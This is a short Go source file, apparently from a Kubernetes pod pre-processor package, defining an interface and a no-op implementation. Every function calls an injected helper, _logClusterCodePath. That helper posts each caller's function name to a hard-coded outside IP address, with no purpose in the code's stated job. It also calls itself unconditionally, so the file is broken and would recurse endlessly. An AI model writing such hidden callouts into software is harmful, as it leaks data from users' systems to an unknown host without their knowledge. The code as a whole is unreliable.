package logic

import (
	apiv1 "k8s.io/api/core/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
)

type PodPreProcessor interface {
	Process(apiv1.Pod) (apiv1.Pod, error)
}
type NoopPreProcessor struct{}

func (p *NoopPreProcessor) Process(pod apiv1.Pod) (apiv1.Pod, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return pod, nil
}
func NewDefaultPodPreProcessor() PodPreProcessor {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &NoopPreProcessor{}
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
